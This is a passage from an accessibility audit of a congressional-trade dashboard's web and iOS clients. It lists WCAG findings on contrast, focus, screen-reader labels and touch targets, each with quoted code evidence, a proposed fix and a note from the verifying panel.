- **Evidence:** dashboardHtml.ts@origin/main:159-162 (:root = dark) `--accent: #4f8cff; --buy: #22c55e; --sell: #ef4444; --exch: #eab308;`; :666 `.btn { background: var(--accent); color: #fff; … font-size: 13px; }`; :516-519 `.tag { font-size: 11px; … color: #fff }` `.tag.B, .tag.P { background: linear-gradient(135deg, var(--buy), …) }` `.tag.S …var(--sell)` `.tag.E …var(--exch)`; :1465 `.branch-toggle.on { background: var(--accent); color: #fff; }` and :1468 `.party-chip.on[data-party="O"] { background: var(--accent); color:#fff; }`.  Recomputed: #fff on #4f8cff = 3.22:1, on #22c55e = 2.28:1, on #ef4444 = 3.76:1, on #eab308 = 1.92:1 (all < 4.5:1 for 11-13px text).  dark/d-trades.png shows white 'Upgrade' button, green 'Buy' and red 'Sell' pills.  Light theme (:192-202 #2563eb 5.17, #15803d 5.02, #dc2626 4.83, #b45309 5.02) passes.
- **Panel:** web-a11y — All ratios reproduced with a WCAG luminance script; screenshot confirms.  Corrected the active-chip citation from :1488 (which is panel-2/text) to :1465/:1468 where white-on-accent actually occurs. · `web-a11y/WEBA11Y-10`

#### 135. [P2] Focus indicators are low-contrast or colour-only on Trends (24%/45% alpha rings, opacity-only chart columns, colour-only info tips)

- **Where:** app/src/ui/dashboardHtml.ts:2534-2549 (focus rules), 954-955-equivalent (.tcol)  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.4.7 / 1.4.11: the Trends-specific replacement focus styles are ≤2:1 or a subtle opacity/colour change, so keyboard users lose track of focus on the Trends view.
- **Impact:** Keyboard users cannot see where focus is across most Trends controls and the 12 chart columns.
- **Fix:** Use opaque outline: 2px solid var(--accent); outline-offset:2px (≥3:1) everywhere; drop the alpha box-shadow rings and opacity-only states; add a forced-colors rule.
- **Evidence:** dashboardHtml.ts@origin/main:2545-2549 `#view-trends .toolbar select:focus-visible, #view-trends .btn:focus-visible, #view-trends .info-tip:focus-visible { outline: none; box-shadow: 0 0 0 3px color-mix(in srgb, var(--accent) 24%, transparent); }` (24% #2563eb on white ≈ 1.40:1; dark 24% #4f8cff on #121b30 ≈ 1.44:1); :2535-2538 `#view-trends tr.clickable:focus-visible { outline: none; }` + `td { … box-shadow: inset 0 0 0 1px color-mix(in srgb, var(--accent) 45%, transparent) }` (≈1.96:1); :954-955 `.tcol { … outline: none; }` `.tcol:hover, .tcol:focus-visible { opacity: 0.8; }`; :394 `.info-tip:hover, .info-tip:focus-visible { color: var(--accent); outline: none; }`.  By contrast :1214 `.clickable:focus-visible { outline: 2px solid var(--accent) }` and :529 `.trades-card:focus-visible` are opaque.
- **Panel:** web-a11y — CSS quoted verbatim; alpha-ring ratios recomputed (1.40 / 1.96 light, 1.44 dark). · `web-a11y/WEBA11Y-11`

#### 136. [P2] Live-region misuse: whole mobile card list is aria-live while counts, filter results, errors and modal messages are not announced

- **Where:** app/src/ui/dashboardHtml.ts:2706,2822,2824,3084,3442,3474  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 4.1.3 Status Messages: results counts, sign-in/checkout errors and connection banners are not announced, while the mobile card container announces dozens of cards on every refresh.
- **Impact:** AT users don't learn a filter produced N results or that sign-in/checkout failed; on mobile they may be flooded with card announcements on every poll.
- **Fix:** Remove aria-live from #tradesCards; add role="status" to #tradesCountMsg/#peopleCount, role="alert" (or status) to #loginMsg/#pricingMsg/#banner error states.
- **Evidence:** dashboardHtml.ts@origin/main:2822 `<div id="tradesCards" class="trades-cards mobile-only" aria-live="polite"></div>` (mobile/trades-a11y.txt:46 `generic live="polite" relevant="additions text"` wrapping all 50 cards; NOTES.md:206-208 background poll ~13 fires in 6 min); :2824 `<span class="note trades-count-msg" id="tradesCountMsg">` no live; :3084 `<p class="note" id="peopleCount">`; :3442 `<p class="note" id="loginMsg"></p>`; :3474 `<p class="note" id="pricingMsg"></p>`; :2706 `<div class="banner" id="banner">` + :4264-4270 setBanner() sets textContent only, no role/aria-live; NOTES.md:176 'the UI showed no visible error state' during 502s.
- **Panel:** web-a11y — All markup lines quoted; live HTML also contains `aria-live="polite"></div>` for #tradesCards.  Delivery's #subsMsg (:3201) and #subsGate already have live regions, so scope is as stated. · `web-a11y/WEBA11Y-14`

#### 137. [P2] Party is conveyed only by an avatar ring colour with no text or accessible equivalent in the desktop Trades table and drawer member cells

- **Where:** app/src/ui/dashboardHtml.ts:4256-4262  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**  ·  **Status:** tracked-in-PR-#1979 (BS-A3, report-only)
- **What:** WCAG 1.4.1 / 1.1.1: party affiliation is encoded purely as ring colour (blue vs red vs purple), invisible to screen readers and hard for colour-blind users.
- **Impact:** Colour-blind and screen-reader users cannot tell a member's party from the desktop Trades list or the drawer identity card.
- **Fix:** Add party text ('R-OK', 'D-CA') to memberCellHtml (the mobile card already renders partyState at :4413-4415) or a visually-hidden 'Republican' span / role=img aria-label on the ring; keep colour as reinforcement.
- **Evidence:** dashboardHtml.ts@origin/main:4256-4262 `function memberAvatarHtml(name, photoUrl, party) { … var ring = bucket ? ' party-' + bucket : ''; return '<span class="avatar' + ring + '">' + esc(initials(name)) + img + '</span>'; }`; :513-515 `.avatar.party-D { box-shadow: 0 0 0 2px var(--party-d) }` / .party-R / .party-O; :4322-4325 memberCellHtml renders only avatar + name + '  |  ST' (no party text); dark/d-trades.png shows red/blue rings as the only party cue; desktop/trades-a11y.txt:50 row text '… Kevin Hern | OK …' contains no party.  Tracked as report-only BS-A3 in PR #1979 (docs/audits/2026-08-17-blind-spots.md 'Color and emoji still carry meaning').
- **Panel:** web-a11y — Confirmed for the desktop table/drawer, but narrowed: the mobile web card DOES render party text ('R-OK' via partyState at :4413-4415, though currently masked by the aria-label in WEBA11Y-02) and Directory has a 'Branch • Party • State' column, so surface changed to web-desktop.  PR #1979 BS-A3 confirmed via gh pr diff. · `web-a11y/WEBA11Y-16`

#### 138. [P2] Column reorder in the Columns dialog is drag-and-drop only (no keyboard/single-pointer alternative)

- **Where:** app/src/ui/dashboardHtml.ts:4657,4660  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.1.1 and 2.5.7 Dragging Movements (AA in 2.2): reordering columns requires a pointer drag; no keyboard or click alternative.
- **Impact:** Keyboard, switch and many touch/motor-impaired users cannot reorder columns (visibility toggles still work).
- **Fix:** Add 'Move up / Move down' buttons (or Alt+↑/↓ on the focused checkbox row) that call moveColumn(); announce the new position via role=status.
- **Evidence:** dashboardHtml.ts@origin/main:4657 `var note = '<div class="panel-note" …>Drag columns here to reorder the Trades table.</div>'`; :4660 `'<label class="colopt" draggable="true" data-colid=…><span class="col-drag" aria-hidden="true">≡</span><input type="checkbox" …>'`; dragstart/dragover/drop handlers at :12691-12713 and moveColumn() (:4674) is only invoked from the drop handler (:12713); grep 'Move up' → 0; desktop/trades-columns-menu.png.
- **Panel:** web-a11y — Code confirmed; moveColumn is called only from the drop handler. · `web-a11y/WEBA11Y-17`

#### 139. [P2] Touch targets below 24×24: mobile #/$ metric toggles (~17×19 px) and 22-px-tall inner asset targets

- **Where:** app/src/ui/dashboardHtml.ts:2040 (#trTimeMetric.seg button), 10561 (asset-cell)  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Quick win**
- **What:** WCAG 2.5.8 Target Size (Minimum): the #/$ toggles are ~17×19 px with no spacing exception; the inner asset-cell targets are 22 px tall.
- **Impact:** Touch users mis-tap the # / $ metric toggle and adjacent controls on phones.
- **Fix:** Give the seg buttons min-width/min-height 24px and remove the nested inner row targets so the ≥40px row is the target.
- **Evidence:** lighthouse/SUMMARY.txt trends-mobile `target-size` items=45: `summary.tf-h > div.tchart-controls > div#trTimeMetric > button.on … 16.9px by 19.5px, should be at least 24px by 24px` and `tbody#trTickers > tr.row > td > div.asset-cell … 119px by 22px`; dashboardHtml.ts@origin/main:2040 `#view-trends #trTimeMetric.seg button { padding: 4px 5px; font-size: 10px; }`.
- **Panel:** web-a11y — Lighthouse measurements and CSS quoted; asset-cell part overlaps WEBA11Y-06 (nesting) but this finding is the target-size aspect. · `web-a11y/WEBA11Y-18`

#### 171. [P2] Trade cards are not grouped for VoiceOver: 6 elements per row, amount/date orphaned

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:1330-1404  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'VoiceOver order/actions', line 97)
- **What:** With 50 rows per page a VoiceOver user must swipe ~300 times to read one page, and the amount ('$1k - $15k') and date are announced as free-standing texts with no link to which trade they belong; the 'Sell' pill and 'R-OK' are also separate stops.
- **Impact:** Core list is exhausting and disorienting with VoiceOver / Switch Control.
- **Fix:** Make each card one element: `.accessibilityElement(children: .ignore)`, `.accessibilityLabel("VSNT, Sell, House, Kevin Hern, R-OK, $1k to $15k, Aug 5 2026")`, `.accessibilityAddTraits(.isButton)`, `.accessibilityAction { onRowTap }` plus `.accessibilityAction(named: "Open politician")` / `"View ticker trades"` for the sub-destinations.  Spell 'Exch' as 'Exchange' in the label.
- **Evidence:** FeedDashboardView.swift:1348-1421 `TradeCard.body`: `HStack { Button(onTickerTap){AssetMark}.accessibilityLabel("View \(assetTitle) Trades"); VStack { HStack { Button(onRowTap){assetTitleText}.accessibilityHint("Opens trade details"); StatusPill }; Button(onPoliticianTap){politicianText} }; VStack { Text(trade.amountLabel); Text(trade.transaction.date.shortDate) } }` — no `.accessibilityElement` on the card; whole-row action is `RowTapModifier` → `.onTapGesture` (:1421-1437).
- **Panel:** ios-a11y — Code quoted; the file's own comment (:1340-1341) acknowledges the bare tap gesture is invisible to VoiceOver and works around it with a Button on the title only. · `ios-a11y/IOSA11Y-04`

#### 172. [P2] Directory Assets/People rows do not adapt to large Dynamic Type ('politi-cians', 'Microsoft Corpo…')

- **Where:** clients/ios/CongressTrade/Views/People/PeopleDirectoryView.swift:215-243 (PersonRow, fixed); clients/ios/CongressTrade/MemberDirectorySearch.swift:420-456 (AssetDirectoryRow, unchanged)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'Dynamic Type through accessibility sizes', line 97)
- **What:** The three-column HStack never reflows; at accessibility sizes (AX1-AX5) the count columns will consume the width and names will be unreadable.
- **Impact:** Users at large text sizes lose company names / party-state meta on every directory row.
- **Fix:** Read `@Environment(\.dynamicTypeSize)` and switch to a vertical layout (`ViewThatFits` or `if dynamicTypeSize.isAccessibilitySize`), drop `lineLimit(1)` on names, and set `.fixedSize(horizontal: false, vertical: true)` on the count labels so 'politicians' never hyphenates.
- **Evidence:** Verifier viewed a11y-xxxl/04-directory-xxxl.png: 'politi-\ncians' hyphenated in a narrow column on MSFT/NVDA/AMZN rows, 'Microsoft Corpo…', 'Nvidia Corporati…' truncated, 'MUNICIPAL-SECURITY' wraps — at XXXL (largest non-AX size).  Code: MemberDirectorySearch.swift:428-462 fixed `HStack` with two trailing `VStack`s and `Text(name)…lineLimit(1)`; PeopleDirectoryView.swift:222-246 same pattern with `Text(metaLine)…lineLimit(1)`.
- **Panel:** ios-a11y — Screenshot viewed and code quoted. · `ios-a11y/IOSA11Y-07`

#### 177. [P2] Nested interactive controls: rows/cards with role=button contain child role=button targets (double tab stops, invalid ARIA)

- **Where:** app/src/ui/dashboardHtml.ts:10560-10561 (row+cell), 10607 (ccard)  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (docs/reviews/2026-08-10-web-ui-expert-review.md §Accessibility)
- **What:** Interactive content inside a button is invalid; every leaderboard row yields two Tab stops doing the same thing, and Consensus cards' aria-label 'View company X' hides BOUGHT/SOLD, counts and members while nesting 4-5 member buttons.  WCAG 4.1.2, 2.4.3, 2.5.3.
- **Impact:** Screen readers announce buttons inside buttons unpredictably; keyboard users tab through ~2x the controls on Trends; the Consensus card name omits its key content.
- **Fix:** Give each row exactly one focusable target and make inner spans non-interactive (or vice versa); for cluster cards remove aria-label and move member faces outside the button or flatten to text.
- **Evidence:** dashboardHtml.ts@origin/main:10560-10561 `<tr class="row clickable" data-asset=…>` + `<td><div class="asset-cell clickable" data-asset=…>` (both matched by ENTITY_FOCUSABLE_SELECTOR :12650 → both role=button); :10607 `<div class="ccard clickable" tabindex="0" role="button" aria-label="View company ' + esc(c.ticker) + '"` with `.faces` member avatars inside (:10616); :11354-11357 `drawer-trade-party … clickable data-member` wrapping memberAvatarHtml.  desktop/trends-a11y.txt:113-114 `button "HUBB Hubbell Inc. 17 buys / 0 sells 2 ~$136k +$136k"` > `button "HUBB Hubbell Inc."`; :202-207 `button "View company SPCX"` > `button "WI William R. Timmons IV"` ×5; desktop/trades-row-expanded-a11y.txt:132-133 `button "KH Kevin Hern Kevin Hern JOINT"` > `button "Kevin Hern"`.  lighthouse/SUMMARY.txt target-size flags `tbody#trTickers > tr.row > td > div.asset-cell … 22px` (29 desktop / 45 mobile items).  Prior: docs/reviews/2026-08-10-web-ui-expert-review.md:282 'nested interactive elements inside row buttons'.
- **Panel:** web-a11y — All code lines and a11y-tree nesting reproduce; prior review line 282 quoted.  Note the Lighthouse run predates PR #2020 (trLargestBuys/Sells removed) but trTickers/trTrending rows remain. · `web-a11y/WEBA11Y-06`

#### 178. [P2] Charts have no text alternative: Buys-vs-Sells columns are unnamed tab stops, snapshot sparklines expose only week ids

- **Where:** app/src/ui/dashboardHtml.ts:9533  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 1.1.1 / 4.1.2 (focusable element without name) / 1.4.1 (series by colour only, mitigated by legend + fixed order).  No data table or summary alternative.
- **Impact:** Screen-reader users hear 12 unnamed focusable items and no numbers; the weekly buy/sell trend and net-flow history are unavailable to them.
- **Fix:** Give each .tcol role="img" aria-label="Week of May 18: 41 buys, 22 sells" (or a visually-hidden <table> alternative and make columns non-focusable); add aria-label with the series summary to sparklines.
- **Evidence:** dashboardHtml.ts@origin/main:9533-9538 `'<div class="tcol" tabindex="0" data-period=…' + 'data-b=… data-s=…' + '<div class="tbars"><i class="buy" style="height:…%"></i><i class="sell" …></i></div><span class="tlbl">' + lbl + '</span></div>'` — focusable, no aria-label/role, values only in data-*; :9432-9452 sparklineHtml() emits bars with no aria-label (`color = v >= 0 ? 'var(--buy)' : 'var(--sell)'`).  desktop/trends-a11y.txt:177-200 chart is 12 `generic` nodes with StaticText 'May 18'…; :40-51 sparkline bars are `generic description="2026-W20"` … with no values.
- **Panel:** web-a11y — Markup and a11y tree reproduce; sparklineHtml confirmed to emit no text alternative. · `web-a11y/WEBA11Y-12`

#### 179. [P2] No <h1>/heading outline and static <title>: view changes are not reflected in title, headings or focus

- **Where:** app/src/ui/dashboardHtml.ts:102  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 2.4.2 (title never describes the current view/drawer), 1.3.1 / 2.4.6 (no h1; Trends & Trades have no headings; other views begin at h3), no announcement/focus management on tab change.
- **Impact:** Screen-reader users cannot use heading navigation on the two main views, get the same title for every view/deep link, and receive no cue that the view changed.
- **Fix:** Set document.title = `${viewName} · Congress.Trade` in the tab handler and drawer opener; add a (visually-hidden) <h1> per view; promote summary text to <h2> inside the summary; move focus to the panel heading on tab activation.
- **Evidence:** Live curl of https://congress.trade/?view=trades (715 KB): `<title>Congress.Trade` and 0 occurrences of `<h1`; dashboardHtml.ts@origin/main:102 `<title>Congress.Trade</title>`, grep 'document.title' → 0; tab handler :12058-12071 only toggles classes/aria-selected and `window.history.replaceState` (no title, no focus move); Trends sections are `<summary class="tf-h">` (:2942 …) not headings — desktop/trends-a11y.txt and trades-a11y.txt contain zero heading nodes; Directory starts at h3 (directory-a11y.txt:10 `heading "Directory" level="3"`).
- **Panel:** web-a11y — Live curl and greps reproduced (title static, 0 h1, 0 document.title); tab handler quoted. · `web-a11y/WEBA11Y-13`

#### 180. [P2] Info tooltips (ⓘ, column tips, lag/amount tips) are hover- or touch-only; keyboard focus shows nothing

- **Where:** app/src/ui/dashboardHtml.ts:62,2995,9414  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** M  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 1.4.13 (not shown on focus, not dismissible/hoverable), 2.1.1 (keyboard users cannot reveal the explanation); aria-label on a generic <span> is prohibited so some SRs will not read it.
- **Impact:** Keyboard users cannot read what Approx.  Volume / Net Flow / Buy Pressure mean; the ⓘ is a mysterious 10px tab stop.
- **Fix:** Make the tip a <button type=button aria-describedby=tipId> and show a real tooltip element on focus and hover (Esc dismiss); reuse the existing .tip-pop for keyboard focus.
- **Evidence:** dashboardHtml.ts@origin/main:9414 `return esc(text) + ' <span class="info-tip" tabindex="0" aria-label="' + esc(tip) + '" title="' + esc(tip) + '">ⓘ</span>'`; :2995 same in the Top Performers summary; :12019 tap-to-reveal code `if (window.matchMedia && !window.matchMedia('(hover: none)').matches) return;` (desktop keeps native title hover only; nothing on focus); :394 focus style is colour-only; :4603 th tips are `title` only.  desktop/trends-a11y.txt:33 `generic "Approximate, from STOCK Act amount ranges…"`.
- **Panel:** web-a11y — Code quoted verbatim; native title tooltips do not appear on keyboard focus in Chrome, and the tap-tooltip path is gated to (hover: none). · `web-a11y/WEBA11Y-15`

#### 249. [P3] Drawer sticky title still aria-hidden even when populated

- **Where:** Detail drawer topbar  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** still-open-since-2026-08-10 (P2-7)
- **What:** 08-10 review P2-7 unchanged.
- **Impact:** Screen readers never hear the drawer's summary title; combined with the missing dialog role the drawer has no accessible name.
- **Fix:** Drop aria-hidden when non-empty and give the panel role=dialog aria-labelledby=drawerTopbarTitle.
- **Evidence:** origin/main dashboardHtml.ts: `<div class="drawer-panel"><div class="drawer-topbar"><span class="drawer-topbar-title" id="drawerTopbarTitle" aria-hidden="true"></span>...` and the enclosing `<div class="drawer" id="detailDrawer">` carries no role=dialog.
- **Panel:** prior-review-followup — Quoted markup matches origin/main exactly; div.drawer has no role attribute. · `prior-review-followup/PRIORREVIEWFOLLOWUP-09`

#### 253. [P3] Fixed-point font sizes do not scale with Dynamic Type (chip glyphs 9pt, Google button 16pt, theme icons 13pt)

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:963-978, 1016-1018  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)  ·  **Status:** new
- **What:** `Font.system(size:)` ignores the user's text size; the 9pt heavy arrows are the only cue in the Side filter chip and stay 9pt at AX5.
- **Impact:** Low-vision users get tiny glyphs while surrounding text grows.
- **Fix:** Use text styles (`.caption2`) or `@ScaledMetric` for these sizes; e.g. `.font(.caption2.weight(.heavy))` for arrows/chevrons and `.font(.body.weight(.medium))` for the Google label.
- **Evidence:** FeedDashboardView.swift:913,:997,:1029 `Image(systemName: "chevron.down").font(.system(size: 9, weight: .bold))`; :976-989 buy/sell/exchange arrows `.font(.system(size: 9, weight: .heavy))` — the entire visible content of the Trade-side chip; Components.swift:1183 `Text(isBusy ? … : "Sign in with Google").font(.system(size: 16, weight: .medium))`; :1457 `.font(.system(size: 13, weight: .semibold))`; :892 `.font(.system(size: 30))`; :108 `.font(.system(size: max(11, size * 0.34)…))`.  a11y-xxxl/01-trades-xxxl.png shows the side-chip arrows still tiny while chip text has grown.
- **Panel:** ios-a11y — All cited lines quoted; the XXXL screenshot corroborates the unscaled arrows. · merged: ios-hig-ux/IOSHIGUX-16, prior-review-followup/PRIORREVIEWFOLLOWUP-25 · `ios-a11y/IOSA11Y-11`

#### 254. [P3] Several section headings lack the header trait, so the VoiceOver headings rotor skips them

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:182, 281  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Heading navigation is the primary way VoiceOver users skim a long page; only some Trends headings and no detail-sheet section titles are exposed.
- **Impact:** Blind users must swipe linearly through the entire Trends page and detail sheets.
- **Fix:** Add `.accessibilityAddTraits(.isHeader)` to each (route all Trends headings through `trendsHeading`; add the trait in `DetailSection`).
- **Evidence:** grep `isHeader` across clients/ios/CongressTrade returns only TrendsView.swift:178 (`trendsHeading`) and :277.  Missing: TrendsView.swift:207-208 `Text("Buys vs Sells").font(.headline)`; :752-754 `Text("Slowest Filers (Avg Delay)")`; :1069-1071 `Text("Speed vs. Data Providers").font(.headline)`; TickerDetailView.swift:110-112 and PoliticianDetailView.swift:102-104 `Text("Recent Trades").font(.headline)`; Components.swift:349-355 `DetailSection` title `Text(title)….textCase(.uppercase)`.
- **Panel:** ios-a11y — Grep confirms exactly two header traits in the whole app. · `ios-a11y/IOSA11Y-13`

#### 255. [P3] KPI / metric tiles announce title and value as two separate elements

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:1037-1056; clients/ios/CongressTrade/Views/Components/Components.swift:170-189  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** VoiceOver reads 'Trades' … '2,178' as unrelated items (12 swipes for six tiles); 3×2 MetricTile grids become 12 stops with values detached from names.
- **Impact:** Slower and more error-prone comprehension of the dashboard for screen-reader users.
- **Fix:** `.accessibilityElement(children: .combine)` on both tile views (VoiceOver then reads 'Trades, 2,178').
- **Evidence:** TrendsView.swift:1041-1060 `TrendKPI` = `VStack { Text(title); Text(value) }` with no `.accessibilityElement`; Components.swift:128-146 `MetricTile` same; used at TickerDetailView.swift:87-96, TradeDetailView.swift:311-346, PoliticianDetailView.swift:169-182.  Only 9 `.accessibilityElement` uses exist app-wide, none on these tiles.
- **Panel:** ios-a11y — Code quoted. · `ios-a11y/IOSA11Y-14`

#### 256. [P3] Fourth filter chip scrolls off-screen at large text with no scroll indicator or wrap

- **Where:** clients/ios/CongressTrade/Views/Feed/FeedDashboardView.swift:436-441 (FeedControlBar)  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** At XXXL (worse at AX sizes) the last filter is invisible and the strip gives no affordance that it scrolls.
- **Impact:** Large-text users may never discover the Buy/Sell filter.
- **Fix:** Use a wrapping layout (`ViewThatFits` → 2 rows, or a flow layout) at large sizes, or at least keep indicators / fade the edge to signal overflow.
- **Evidence:** Verifier viewed a11y-xxxl/01-trades-xxxl.png: the Trade-side chip is clipped at the right edge (only the up/down arrows visible); 02-trends-xxxl.png same.  FeedDashboardView.swift:449 `ScrollView(.horizontal, showsIndicators: false)`; capture NOTES §8 'the 4th (trade-side) chip is pushed off-screen right … reachable but not visible'.
- **Panel:** ios-a11y — Screenshot viewed; clipping reproduced. · `ios-a11y/IOSA11Y-15`

#### 257. [P3] Trends leaderboard accessibility labels drop data that is visible ($ metric, % change, politician count)

- **Where:** clients/ios/CongressTrade/Views/TrendsView.swift:329, 397  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Switching the #/$ toggle changes nothing for VoiceOver, and Rising Activity's growth percentage is never spoken.
- **Impact:** Screen-reader users get less information than sighted users from the same rows.
- **Fix:** Build labels from the same values rendered: include est. volume when the $ metric is selected, and add politicians + percentage to Rising Activity labels.
- **Evidence:** TrendsView.swift:325 `.accessibilityLabel("\(item.ticker), \(item.formattedName ?? "—"), \(item.tradeCount) trades")` regardless of `tickerMetric == .dollars` (:306-318 shows `CompactFormat.usd(item.estVolumeUsd)` as the headline in that mode); :393 `.accessibilityLabel("\(item.ticker), \(item.priorCount) to \(item.recentCount) trades")` omits `"\(item.recentMembers ?? 0) politicians"` (:370) and the `+X%` pill (:379).
- **Panel:** ios-a11y — Code quoted. · `ios-a11y/IOSA11Y-20`

#### 258. [P3] Legal footer links are ~13pt-tall caption2 tap targets

- **Where:** clients/ios/CongressTrade/Views/Components/Components.swift:1435-1465  ·  **Surface:** iOS  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** 11pt inline links separated by 2-space bullets are far below the 44pt target and are hard to hit individually.
- **Impact:** Privacy/Terms/Support are required App Store destinations yet are the hardest controls to tap.
- **Fix:** Give each link `.frame(minHeight: 44)` / `.padding(.vertical, 12)` in `LegalFooterLinks` and use it (an `HStack` of buttons) instead of the attributed-Text variant, or use `.buttonStyle(.borderless)` with more spacing.
- **Evidence:** Components.swift:1389-1408 `LegalFooterLinks` — `Button(destination.title) { openURL(destination.url) }.font(.caption2)…buttonStyle(.plain)` with no frame; FeedDashboardView.swift:661-671 `AppLegalFooter` renders the four Markdown links inside one `Text(AppLegal.attributed).font(.caption2)` (light/03: 'Privacy • Terms • Pricing • Support' ~11pt grey).
- **Panel:** ios-a11y — Code quoted; the AppLegalFooter comment explains the Markdown-Text choice was for wrapping at large type, so the fix should preserve wrapping. · merged: ios-shipped-app/IOSSHIPPEDAPP-45 · `ios-a11y/IOSA11Y-23`

#### 288. [P3] Segmented toggles (# / $, People / Assets) expose no pressed state and symbol-only names

- **Where:** app/src/ui/dashboardHtml.ts:2919-2922, 3062-3065  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** WCAG 4.1.2: the active option is shown only by class styling; names '#'/'$' read as 'number sign'/'dollar'.
- **Impact:** AT users can't tell whether the table is ranked by count or volume, or which directory mode is active.
- **Fix:** Add aria-pressed (toggle in the handlers) and aria-label='Rank by trade count' / 'Rank by estimated volume'; same for People/Assets.
- **Evidence:** dashboardHtml.ts@origin/main:2919-2922 `<div class="seg" id="trTickerMetric" role="group" aria-label="Rank by trade count or volume"><button type="button" data-m="trades" class="on" …>#</button><button … >$</button>`; :2964-2967 #trTimeMetric likewise; :3062-3065 #dirMode People/Assets; setTickerSort() :9421-9429, setTrTimeMetric() :10619-10626 and setDirectoryMode() :9840-9848 only toggle class 'on' (no aria-pressed), whereas the theme seg does (:4129/:4157).  desktop/trends-a11y.txt:106-107 `button "#"`, `button "$"`; directory-a11y.txt:12-13 `button "People"`, `button "Assets"`.
- **Panel:** web-a11y — All three handlers read; none set aria-pressed. · `web-a11y/WEBA11Y-19`

#### 289. [P3] Mobile bottom tab names are duplicated with emoji ('📈 Trends Trends') via CSS pseudo-content

- **Where:** app/src/ui/dashboardHtml.ts:1874-1875, 2695-2700  ·  **Surface:** Web · mobile  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** CSS generated content is included in the accessible name, so each tab reads emoji + label twice; the emoji is decorative.  WCAG 1.1.1 / 4.1.2.
- **Impact:** Verbose, confusing tab announcements on mobile.
- **Fix:** Render icon and label as real spans (<span aria-hidden="true">📈</span><span class="tab-lbl">Trends</span>) instead of pseudo-content, or set aria-label on each tab.
- **Evidence:** dashboardHtml.ts@origin/main:1864 `padding: 6px 4px; min-height: 44px; font-size: 0; min-width: 0;` (nav.tabs button), :1874-1875 `nav.tabs button::before { content: attr(data-icon); … } nav.tabs button::after { content: attr(data-mobile); … }`; mobile/trades-a11y.txt:3-6 `tab "📈 Trends Trends"`, `tab "☰ Trades Trades"`, `tab "👥 Directory Directory"`, `tab "🔔 Delivery Delivery"`.
- **Panel:** web-a11y — CSS and mobile a11y tree reproduce exactly. · `web-a11y/WEBA11Y-20`

#### 290. [P3] Avatar initials + img alt + name make every politician read three times ('RK Ro Khanna Ro Khanna')

- **Where:** app/src/ui/dashboardHtml.ts:4256-4262  ·  **Surface:** Web  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** Redundant text alternatives (1.1.1 best practice): initials fallback text is not hidden when the photo loads and the img alt duplicates the adjacent name.
- **Impact:** Screen-reader verbosity on every list; each directory row announces the name twice plus initials.
- **Fix:** Use alt="" when a name is adjacent, and aria-hidden="true" on the initials span; keep a real alt only where the avatar is the sole identifier (cluster faces).
- **Evidence:** dashboardHtml.ts@origin/main:4257-4262 memberAvatarHtml: `'<img src="…" alt="' + esc(name || '') + '" …>'` overlaid on `esc(initials(name))` inside `.avatar`, adjacent to the visible name; desktop/directory-a11y.txt:25 `button "RK Ro Khanna Ro Khanna" description="Open Ro Khanna"`; trades-a11y.txt:50 `"… KH Kevin Hern Kevin Hern | OK …"`.
- **Panel:** web-a11y — Code and a11y trees match. · `web-a11y/WEBA11Y-21`

#### 291. [P3] Desktop Trends section <summary> elements remain focusable Tab stops that mouse users can't operate and that carry interactive children

- **Where:** app/src/ui/dashboardHtml.ts:2205  ·  **Surface:** Web · desktop  ·  **Category:** a11y  ·  **Effort:** S  ·  **Verdict:** confirmed (high confidence)
- **What:** On desktop each header is a keyboard-focusable disclosure that keyboard users can collapse (Enter/Space) but mouse users cannot toggle (pointer-events:none), and nested buttons inside <summary> are non-conforming HTML.  WCAG 2.4.3 / 4.1.2.
- **Impact:** Extra, purposeless Tab stops on desktop Trends and inconsistent behaviour between input modalities.
